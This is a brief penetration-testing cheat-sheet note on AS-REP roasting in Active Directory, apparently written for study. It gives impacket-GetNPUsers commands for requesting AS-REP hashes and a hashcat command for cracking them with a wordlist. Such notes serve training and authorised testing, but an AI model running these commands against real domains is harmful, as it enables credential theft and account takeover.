Similar to [[05_Kerberoasting]] but you don't need a password just a username and then you'll crack that users password


Gaining the hash

`impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request`
`impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -dc-ip <DC_IP>`

Cracking the Hash

`hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt`